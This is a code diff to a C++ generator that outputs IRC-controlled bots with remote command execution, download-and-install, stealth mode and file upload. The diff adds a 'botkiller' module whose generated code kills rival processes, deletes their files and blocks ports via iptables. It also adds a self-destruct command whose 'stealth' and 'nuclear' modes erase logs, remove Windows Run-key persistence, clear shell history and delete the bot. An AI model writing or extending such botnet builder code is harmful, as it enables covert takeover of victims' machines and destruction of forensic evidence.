@@ -101,9 +101,12 @@ public:
         std::cout << "11. Toggle Download Features (" << (enableDownloadFeatures ? "ON" : "OFF") << ")\n";
         std::cout << "12. Set Download Directory\n";
         std::cout << "13. Toggle Stealth Mode (" << (stealthMode ? "ON" : "OFF") << ")\n";
-        std::cout << "14. Show Current Settings\n";
-        std::cout << "15. Generate Enhanced Bot\n";
-        std::cout << "16. Exit\n";
+        std::cout << "14. Toggle Botkiller (" << (enableBotkiller ? "ON" : "OFF") << ")\n";
+        std::cout << "15. Manage Suspicious Process Names\n";
+        std::cout << "16. Manage Suspicious Ports\n";
+        std::cout << "17. Show Current Settings\n";
+        std::cout << "18. Generate Enhanced Bot\n";
+        std::cout << "19. Exit\n";
         std::cout << "Choose option: ";
     }
     
@@ -229,6 +232,79 @@ public:
         std::cout << "Stealth mode: " << (stealthMode ? "ENABLED" : "DISABLED") << "\n";
     }
     
+    void toggleBotkiller() {
+        enableBotkiller = !enableBotkiller;
+        std::cout << "Botkiller: " << (enableBotkiller ? "ENABLED" : "DISABLED") << "\n";
+    }
+    
+    void manageSuspiciousProcessNames() {
+        std::cout << "Current suspicious process names:\n";
+        for (size_t i = 0; i < suspiciousProcessNames.size(); i++) {
+            std::cout << "  " << (i+1) << ". " << suspiciousProcessNames[i] << "\n";
+        }
+        std::cout << "Enter: 'add <name>' to add, 'remove <number>' to remove, 'clear' to clear all: ";
+        std::string input;
+        std::getline(std::cin, input);
+        
+        std::istringstream iss(input);
+        std::string action;
+        iss >> action;
+        
+        if (action == "add") {
+            std::string name;
+            iss >> name;
+            if (!name.empty()) {
+                suspiciousProcessNames.push_back(name);
+                std::cout << "Added: " << name << "\n";
+            }
+        } else if (action == "remove") {
+            int index;
+            iss >> index;
+            if (index > 0 && index <= suspiciousProcessNames.size()) {
+                std::string removed = suspiciousProcessNames[index-1];
+                suspiciousProcessNames.erase(suspiciousProcessNames.begin() + index - 1);
+                std::cout << "Removed: " << removed << "\n";
+            }
+        } else if (action == "clear") {
+            suspiciousProcessNames.clear();
+            std::cout << "Cleared all suspicious process names\n";
+        }
+    }
+    
+    void manageSuspiciousPorts() {
+        std::cout << "Current suspicious ports:\n";
+        for (size_t i = 0; i < suspiciousPorts.size(); i++) {
+            std::cout << "  " << (i+1) << ". " << suspiciousPorts[i] << "\n";
+        }
+        std::cout << "Enter: 'add <port>' to add, 'remove <number>' to remove, 'clear' to clear all: ";
+        std::string input;
+        std::getline(std::cin, input);
+        
+        std::istringstream iss(input);
+        std::string action;
+        iss >> action;
+        
+        if (action == "add") {
+            std::string port;
+            iss >> port;
+            if (!port.empty()) {
+                suspiciousPorts.push_back(port);
+                std::cout << "Added port: " << port << "\n";
+            }
+        } else if (action == "remove") {
+            int index;
+            iss >> index;
+            if (index > 0 && index <= suspiciousPorts.size()) {
+                std::string removed = suspiciousPorts[index-1];
+                suspiciousPorts.erase(suspiciousPorts.begin() + index - 1);
+                std::cout << "Removed port: " << removed << "\n";
+            }
+        } else if (action == "clear") {
+            suspiciousPorts.clear();
+            std::cout << "Cleared all suspicious ports\n";
+        }
+    }
+    
     void showSettings() {
         std::cout << "\n=== Current Enhanced Bot Settings ===\n";
         std::cout << "Bot Name: " << botName << "\n";
@@ -241,6 +317,17 @@ public:
         std::cout << "Download Features: " << (enableDownloadFeatures ? "enabled" : "disabled") << "\n";
         std::cout << "Download Directory: " << downloadDirectory << "\n";
         std::cout << "Stealth Mode: " << (stealthMode ? "enabled" : "disabled") << "\n";
+        std::cout << "Botkiller: " << (enableBotkiller ? "enabled" : "disabled") << "\n";
+        if (enableBotkiller) {
+            std::cout << "Suspicious Process Names (" << suspiciousProcessNames.size() << "):\n";
+            for (const auto& name : suspiciousProcessNames) {
+                std::cout << "  " << name << "\n";
+            }
+            std::cout << "Suspicious Ports (" << suspiciousPorts.size() << "):\n";
+            for (const auto& port : suspiciousPorts) {
+                std::cout << "  " << port << "\n";
+            }
+        }
         std::cout << "Auto-Join Channels:\n";
         for (const auto& ch : autoJoinChannels) {
             std::cout << "  " << ch << "\n";
@@ -275,10 +362,12 @@ public:
         if (useRandomNicknames) std::cout << "  ✓ Random nickname generation\n";
         if (enableDownloadFeatures) std::cout << "  ✓ Download & install capabilities\n";
         if (stealthMode) std::cout << "  ✓ Stealth mode operation\n";
+        if (enableBotkiller) std::cout << "  ✓ Botkiller & self-cleanup\n";
         std::cout << "  ✓ File upload/download commands\n";
         std::cout << "  ✓ Remote command execution\n";
         std::cout << "  ✓ Bot management commands\n";
-        std::cout << "  ✓ Anti-malware scanner\n";
+        std::cout << "  ✓ Process scanning & termination\n";
+        std::cout << "  ✓ Self-destruction capabilities\n";
         std::cout << "\nTo compile: g++ -std=c++17 -o " << botName << "_enhanced_bot " << filename << "\n";
         std::cout << "To run: ./" << botName << "_enhanced_bot\n";
     }
@@ -382,6 +471,9 @@ private:
         code << "    std::string logFile;\n";
         code << "    std::string downloadDir;\n";
         code << "    bool stealthMode;\n";
+        code << "    bool botkillerEnabled;\n";
+        code << "    std::vector<std::string> suspiciousNames;\n";
+        code << "    std::vector<std::string> suspiciousPorts;\n";
         code << "    int sockfd;\n";
         code << "    bool running;\n\n";
         
@@ -398,8 +490,20 @@ private:
         code << "        logFile = \"" << logFile << "\";\n";
         code << "        downloadDir = \"" << downloadDirectory << "\";\n";
         code << "        stealthMode = " << (stealthMode ? "true" : "false") << ";\n";
+        code << "        botkillerEnabled = " << (enableBotkiller ? "true" : "false") << ";\n";
         code << "        autoReconnect = " << (autoReconnect ? "true" : "false") << ";\n";
         code << "        reconnectDelay = " << reconnectDelay << ";\n\n";
+        
+        // Add suspicious process names
+        for (const auto& name : suspiciousProcessNames) {
+            code << "        suspiciousNames.push_back(\"" << name << "\");\n";
+        }
+        
+        // Add suspicious ports
+        for (const auto& port : suspiciousPorts) {
+            code << "        suspiciousPorts.push_back(\"" << port << "\");\n";
+        }
+        code << "\n";
         
         for (const auto& ch : autoJoinChannels) {
             code << "        autoJoinChannels.push_back(\"" << ch << "\");\n";
@@ -538,10 +642,175 @@ private:
             code << "        std::string cmd = \"chmod +x \" + filename + \" && ./\" + filename + \" &\";\n";
             code << "        system(cmd.c_str());\n";
             code << "        #endif\n";
-            code << "    }\n\n";
-        }
-        
-        // Message handling with enhanced commands
+                         code << "    }\n\n";
+         }
+         
+         if (enableBotkiller) {
+             // Botkiller functionality
+             code << "    // Botkiller Functions\n";
+             code << "    std::string getSelfPath() {\n";
+             code << "        char path[1024];\n";
+             code << "        #ifdef _WIN32\n";
+             code << "        GetModuleFileNameA(NULL, path, sizeof(path));\n";
+             code << "        #else\n";
+             code << "        ssize_t len = readlink(\"/proc/self/exe\", path, sizeof(path) - 1);\n";
+             code << "        if (len != -1) path[len] = '\\0';\n";
+             code << "        #endif\n";
+             code << "        return std::string(path);\n";
+             code << "    }\n\n";
+             
+             code << "    std::string scanForMalware() {\n";
+             code << "        std::string results = \"\";\n";
+             code << "        std::string selfPath = getSelfPath();\n";
+             code << "        \n";
+             code << "        // Build process search pattern\n";
+             code << "        std::string pattern = \"\";\n";
+             code << "        for (size_t i = 0; i < suspiciousNames.size(); i++) {\n";
+             code << "            if (i > 0) pattern += \"|\";\n";
+             code << "            pattern += suspiciousNames[i];\n";
+             code << "        }\n";
+             code << "        \n";
+             code << "        // Scan for suspicious processes (exclude self)\n";
+             code << "        std::string psCmd = \"ps aux | grep -E '(\" + pattern + \")' | grep -v grep | grep -v '\" + selfPath + \"'\";\n";
+             code << "        FILE* psPipe = popen(psCmd.c_str(), \"r\");\n";
+             code << "        if (psPipe) {\n";
+             code << "            char buffer[256];\n";
+             code << "            std::string processes = \"\";\n";
+             code << "            while (fgets(buffer, sizeof(buffer), psPipe) != NULL) {\n";
+             code << "                processes += buffer;\n";
+             code << "            }\n";
+             code << "            pclose(psPipe);\n";
+             code << "            if (!processes.empty()) {\n";
+             code << "                results += \"Suspicious processes:\\n\" + processes;\n";
+             code << "            }\n";
+             code << "        }\n";
+             code << "        \n";
+             code << "        // Scan for suspicious files\n";
+             code << "        std::string findCmd = \"find /tmp /var/tmp /home -type f -name '*\" + pattern + \"*' 2>/dev/null | grep -v '\" + selfPath + \"'\";\n";
+             code << "        FILE* findPipe = popen(findCmd.c_str(), \"r\");\n";
+             code << "        if (findPipe) {\n";
+             code << "            char buffer[256];\n";
+             code << "            std::string files = \"\";\n";
+             code << "            while (fgets(buffer, sizeof(buffer), findPipe) != NULL) {\n";
+             code << "                files += buffer;\n";
+             code << "            }\n";
+             code << "            pclose(findPipe);\n";
+             code << "            if (!files.empty()) {\n";
+             code << "                results += \"\\nSuspicious files:\\n\" + files;\n";
+             code << "            }\n";
+             code << "        }\n";
+             code << "        \n";
+             code << "        // Scan for suspicious network connections\n";
+             code << "        std::string portPattern = \"\";\n";
+             code << "        for (size_t i = 0; i < suspiciousPorts.size(); i++) {\n";
+             code << "            if (i > 0) portPattern += \"|\";\n";
+             code << "            portPattern += \":\" + suspiciousPorts[i];\n";
+             code << "        }\n";
+             code << "        std::string netCmd = \"netstat -tuln | grep -E '(\" + portPattern + \")'\";\n";
+             code << "        FILE* netPipe = popen(netCmd.c_str(), \"r\");\n";
+             code << "        if (netPipe) {\n";
+             code << "            char buffer[256];\n";
+             code << "            std::string connections = \"\";\n";
+             code << "            while (fgets(buffer, sizeof(buffer), netPipe) != NULL) {\n";
+             code << "                connections += buffer;\n";
+             code << "            }\n";
+             code << "            pclose(netPipe);\n";
+             code << "            if (!connections.empty()) {\n";
+             code << "                results += \"\\nSuspicious connections:\\n\" + connections;\n";
+             code << "            }\n";
+             code << "        }\n";
+             code << "        \n";
+             code << "        return results.empty() ? \"No threats detected.\" : results;\n";
+             code << "    }\n\n";
+             
+             code << "    void killMalware() {\n";
+             code << "        std::string selfPath = getSelfPath();\n";
+             code << "        \n";
+             code << "        // Build process kill pattern\n";
+             code << "        std::string pattern = \"\";\n";
+             code << "        for (size_t i = 0; i < suspiciousNames.size(); i++) {\n";
+             code << "            if (i > 0) pattern += \"|\";\n";
+             code << "            pattern += suspiciousNames[i];\n";
+             code << "        }\n";
+             code << "        \n";
+             code << "        // Kill suspicious processes (exclude self)\n";
+             code << "        std::string killCmd = \"pkill -f '\" + pattern + \"' 2>/dev/null\";\n";
+             code << "        system(killCmd.c_str());\n";
+             code << "        \n";
+             code << "        // Remove suspicious files (exclude self)\n";
+             code << "        std::string removeCmd = \"find /tmp /var/tmp /home -type f -name '*\" + pattern + \"*' 2>/dev/null | grep -v '\" + selfPath + \"' | xargs rm -f 2>/dev/null\";\n";
+             code << "        system(removeCmd.c_str());\n";
+             code << "        \n";
+             code << "        // Block suspicious ports\n";
+             code << "        for (const auto& port : suspiciousPorts) {\n";
+             code << "            std::string blockCmd = \"iptables -A INPUT -p tcp --dport \" + port + \" -j DROP 2>/dev/null\";\n";
+             code << "            system(blockCmd.c_str());\n";
+             code << "        }\n";
+             code << "    }\n\n";
+             
+             code << "    void selfDestruct(const std::string& mode = \"clean\") {\n";
+             code << "        std::string selfPath = getSelfPath();\n";
+             code << "        log(\"Self-destruct initiated: \" + mode);\n";
+             code << "        \n";
+             code << "        if (mode == \"stealth\") {\n";
+             code << "            // Remove log file\n";
+             code << "            std::string removeLogCmd = \"rm -f \" + logFile;\n";
+             code << "            system(removeLogCmd.c_str());\n";
+             code << "            \n";
+             code << "            // Remove startup entries\n";
+             code << "            #ifdef _WIN32\n";
+             code << "            system(\"reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsService /f 2>nul\");\n";
+             code << "            #else\n";
+             code << "            system(\"rm -f ~/.config/autostart/*bot* ~/.bashrc.bak 2>/dev/null\");\n";
+             code << "            #endif\n";
+             code << "            \n";
+             code << "            // Create self-deletion script\n";
+             code << "            #ifdef _WIN32\n";
+             code << "            std::string script = \"@echo off\\ntimeout /t 2 /nobreak > nul\\ndel \\\"\" + selfPath + \"\\\"\\ndel \\\"%~f0\\\"\";\n";
+             code << "            std::ofstream scriptFile(\"cleanup.bat\");\n";
+             code << "            if (scriptFile.is_open()) {\n";
+             code << "                scriptFile << script;\n";
+             code << "                scriptFile.close();\n";
+             code << "                system(\"start /min cleanup.bat\");\n";
+             code << "            }\n";
+             code << "            #else\n";
+             code << "            std::string script = \"#!/bin/bash\\nsleep 2\\nrm -f \\\"\" + selfPath + \"\\\"\\nrm -- \\\"$0\\\"\";\n";
+             code << "            std::ofstream scriptFile(\"cleanup.sh\");\n";
+             code << "            if (scriptFile.is_open()) {\n";
+             code << "                scriptFile << script;\n";
+             code << "                scriptFile.close();\n";
+             code << "                system(\"chmod +x cleanup.sh && nohup ./cleanup.sh &\");\n";
+             code << "            }\n";
+             code << "            #endif\n";
+             code << "        }\n";
+             code << "        else if (mode == \"nuclear\") {\n";
+             code << "            // Nuclear cleanup - remove everything\n";
+             code << "            system(\"rm -rf /tmp/*bot* /tmp/*malware* /var/tmp/*bot* 2>/dev/null\");\n";
+             code << "            system(\"rm -f \" + logFile);\n";
+             code << "            \n";
+             code << "            #ifdef _WIN32\n";
+             code << "            system(\"reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsService /f 2>nul\");\n";
+             code << "            system(\"del /f /q %temp%\\\\*bot* %temp%\\\\*malware* 2>nul\");\n";
+             code << "            #else\n";
+             code << "            system(\"rm -f ~/.config/autostart/*bot* ~/.bashrc.bak 2>/dev/null\");\n";
+             code << "            system(\"history -c && history -w 2>/dev/null\");\n";
+             code << "            #endif\n";
+             code << "            \n";
+             code << "            // Self-deletion\n";
+             code << "            std::string script = \"sleep 1 && rm -f \\\"\" + selfPath + \"\\\" &\";\n";
+             code << "            system(script.c_str());\n";
+             code << "        }\n";
+             code << "        else {\n";
+             code << "            // Clean shutdown - just remove self\n";
+             code << "            std::string removeCmd = \"rm -f \\\"\" + selfPath + \"\\\"\";\n";
+             code << "            system(removeCmd.c_str());\n";
+             code << "        }\n";
+             code << "        \n";
+             code << "        running = false;\n";
+             code << "    }\n\n";
+         }
+         
+         // Message handling with enhanced commands
         code << "    void handleMessage(const std::string& line) {\n";
         code << "        if (line.find(\"PING :\") == 0) {\n";
         code << "            std::string response = line.substr(6);\n";
@@ -585,10 +854,13 @@ private:
         }
         code << "            if (isAdmin(sender)) {\n";
         code << "                help += \", !join, !part, !say, !quit, !restart\";\n";
-        if (enableDownloadFeatures) {
-            code << "                help += \", !download, !install, !downloadinstall\";\n";
-        }
-        code << "                help += \", !upload, !execute, !botkill, !botkiller\";\n";
+                 if (enableDownloadFeatures) {
+             code << "                help += \", !download, !install, !downloadinstall\";\n";
+         }
+         if (enableBotkiller) {
+             code << "                help += \", !scan, !kill, !selfdestruct\";\n";
+         }
+         code << "                help += \", !upload, !execute\";\n";
         code << "            }\n";
         code << "            sendCommand(\"PRIVMSG \" + target + \" :\" + help);\n";
         code << "        }\n";
@@ -722,13 +994,49 @@ private:
         code << "                }\n";
         code << "            }\n";
         
-        code << "            else if (command == \"!quit\") {\n";
-        code << "                sendCommand(\"QUIT :Shutting down\");\n";
-        code << "                running = false;\n";
-        code << "            }\n";
-        
-        code << "        }\n";
-        code << "    }\n\n";
+                 if (enableBotkiller) {
+             code << "            else if (command == \"!scan\") {\n";
+             code << "                if (botkillerEnabled) {\n";
+             code << "                    std::string scanResults = scanForMalware();\n";
+             code << "                    if (scanResults.length() > 400) {\n";
+             code << "                        sendCommand(\"PRIVMSG \" + target + \" :Scan results (truncated): \" + scanResults.substr(0, 400) + \"...\");\n";
+             code << "                    } else {\n";
+             code << "                        sendCommand(\"PRIVMSG \" + target + \" :Scan results: \" + scanResults);\n";
+             code << "                    }\n";
+             code << "                    log(\"Malware scan completed\");\n";
+             code << "                } else {\n";
+             code << "                    sendCommand(\"PRIVMSG \" + target + \" :Botkiller is disabled\");\n";
+             code << "                }\n";
+             code << "            }\n";
+             
+             code << "            else if (command == \"!kill\") {\n";
+             code << "                if (botkillerEnabled) {\n";
+             code << "                    killMalware();\n";
+             code << "                    sendCommand(\"PRIVMSG \" + target + \" :Malware termination completed\");\n";
+             code << "                    log(\"Malware kill operation completed\");\n";
+             code << "                } else {\n";
+             code << "                    sendCommand(\"PRIVMSG \" + target + \" :Botkiller is disabled\");\n";
+             code << "                }\n";
+             code << "            }\n";
+             
+             code << "            else if (command == \"!selfdestruct\") {\n";
+             code << "                std::string mode;\n";
+             code << "                iss >> mode;\n";
+             code << "                if (mode.empty()) mode = \"clean\";\n";
+             code << "                \n";
+             code << "                sendCommand(\"PRIVMSG \" + target + \" :Self-destruct initiated: \" + mode);\n";
+             code << "                sendCommand(\"QUIT :Self-destruct sequence activated\");\n";
+             code << "                selfDestruct(mode);\n";
+             code << "            }\n";
+         }
+         
+         code << "            else if (command == \"!quit\") {\n";
+         code << "                sendCommand(\"QUIT :Shutting down\");\n";
+         code << "                running = false;\n";
+         code << "            }\n";
+         
+         code << "        }\n";
+         code << "    }\n\n";
         
         // Run method
         code << "    void run() {\n";
@@ -880,10 +1188,16 @@ int main() {
         } else if (choice == "13") {
             builder.toggleStealthMode();
         } else if (choice == "14") {
-            builder.showSettings();
+            builder.toggleBotkiller();
         } else if (choice == "15") {
-            builder.generateBot();
+            builder.manageSuspiciousProcessNames();
         } else if (choice == "16") {
+            builder.manageSuspiciousPorts();
+        } else if (choice == "17") {
+            builder.showSettings();
+        } else if (choice == "18") {
+            builder.generateBot();
+        } else if (choice == "19") {
             std::cout << "Goodbye!\n";
             break;
         } else {
